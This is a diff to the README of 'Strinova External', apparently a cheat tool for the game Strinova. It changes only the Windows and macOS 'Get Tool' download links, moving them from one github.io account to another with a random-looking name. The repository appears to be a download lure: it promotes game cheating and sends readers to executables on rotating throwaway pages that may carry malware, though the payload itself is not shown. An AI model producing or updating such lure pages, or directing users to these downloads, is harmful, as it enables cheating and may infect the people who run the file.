@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/ktczmmrisbei/strinova-external)
 
-[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ![Strinova External](game.jpg)
 
@@ -75,7 +75,7 @@ Strinova by iDreamSky is a stylish tactical shooter where characters can transfo
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 ## ⚖️ Legal
 
